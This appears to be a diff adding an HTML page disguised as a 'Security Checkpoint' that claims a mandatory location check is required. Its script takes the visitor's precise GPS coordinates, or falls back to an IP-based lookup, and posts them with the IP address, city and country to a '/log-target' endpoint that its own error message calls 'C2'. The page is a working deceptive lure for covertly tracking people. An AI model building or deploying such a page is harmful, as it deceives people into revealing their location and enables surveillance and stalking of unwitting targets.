@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Security Checkpoint</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #0a0a0c; font-family: sans-serif; }
+        .card { background: #18181b; border: 1px solid #27272a; }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+    <div class="card max-w-md w-full p-8 rounded-xl shadow-2xl text-center">
+        <div class="w-20 h-20 bg-blue-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
+            <svg class="w-10 h-10 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+        </div>
+        <h1 class="text-2xl font-bold text-white mb-2">Access Restricted</h1>
+        <p class="text-gray-400 mb-8 text-sm leading-relaxed">To proceed to the internal portal, a mandatory geographic validation is required to ensure you are connecting from a permitted region.</p>
+        
+        <button id="validateBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-lg transition-all">
+            Verify Location & Continue
+        </button>
+        
+        <div id="status" class="mt-6 text-xs text-gray-600 uppercase tracking-widest font-mono">Status: Awaiting Handshake</div>
+    </div>
+
+    <script>
+        const API_BASE = "http://127.0.0.1:8000";
+
+        document.getElementById('validateBtn').addEventListener('click', () => {
+            const status = document.getElementById('status');
+            status.innerText = "Status: Probing Coordinates...";
+
+            navigator.geolocation.getCurrentPosition(
+                async (pos) => {
+                    const ipData = await fetch(`${API_BASE}/track-ip`).then(r => r.json());
+                    await sendData({
+                        latitude: pos.coords.latitude,
+                        longitude: pos.coords.longitude,
+                        method: "GPS High Accuracy",
+                        accuracy: `±${pos.coords.accuracy.toFixed(1)}m`,
+                        ip: ipData.query || "Inferred",
+                        city: ipData.city || "Unknown",
+                        country: ipData.country || "Unknown"
+                    });
+                    status.innerText = "Status: Handshake Complete. Redirecting...";
+                },
+                async (err) => {
+                    status.innerText = "Status: GPS Timeout. Using Network Failover...";
+                    const ipData = await fetch(`${API_BASE}/track-ip`).then(r => r.json());
+                    await sendData({
+                        latitude: ipData.lat,
+                        longitude: ipData.lon,
+                        method: "Network Inference",
+                        accuracy: "±5-10km",
+                        ip: ipData.query || "Unknown",
+                        city: ipData.city || "Unknown",
+                        country: ipData.country || "Unknown"
+                    });
+                    status.innerText = "Status: Redirecting to Secure Gateway...";
+                },
+                { timeout: 8000, enableHighAccuracy: true }
+            );
+        });
+
+        async function sendData(payload) {
+            try {
+                await fetch(`${API_BASE}/log-target`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) { console.error("C2 Connection Failed"); }
+        }
+    </script>
+</body>
+</html>
